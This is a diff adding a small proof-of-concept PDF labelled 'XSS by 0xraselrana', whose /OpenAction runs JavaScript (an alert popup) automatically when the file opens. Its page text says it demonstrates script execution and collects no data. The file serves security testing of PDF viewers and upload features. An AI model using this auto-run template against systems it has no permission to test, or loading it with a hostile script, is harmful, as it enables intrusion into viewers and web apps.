@@ -1,0 +1,101 @@
+%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction <<
+  /S /JavaScript
+  /JS (app.alert\("XSS by 0xraselrana"\);)
+>>
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Resources <<
+  /Font <<
+    /F1 4 0 R
+    /F2 5 0 R
+  >>
+>>
+/Contents 6 0 R
+>>
+endobj
+
+4 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Helvetica
+>>
+endobj
+
+5 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Helvetica-Bold
+>>
+endobj
+
+6 0 obj
+<<
+/Length 272
+>>
+stream
+0.25 0.35 0.55 rg
+100 700 412 2 re
+f
+0 0 0 rg
+BT
+/F2 26 Tf
+100 620 Td
+(XSS by 0xraselrana) Tj
+ET
+BT
+/F1 13 Tf
+100 580 Td
+(This document demonstrates JavaScript execution.) Tj
+ET
+BT
+/F1 13 Tf
+100 550 Td
+(No credentials or sensitive data are collected.) Tj
+ET
+BT
+/F1 11 Tf
+100 500 Td
+(If supported by the viewer, an alert popup will appear.) Tj
+ET
+endstream
+endobj
+
+xref
+0 7
+0000000000 65535 f
+0000000009 00000 n
+0000000200 00000 n
+0000000260 00000 n
+0000000461 00000 n
+0000000531 00000 n
+0000000630 00000 n
+
+trailer
+<<
+/Size 7
+/Root 1 0 R
+>>
+startxref
+953
+%%EOF
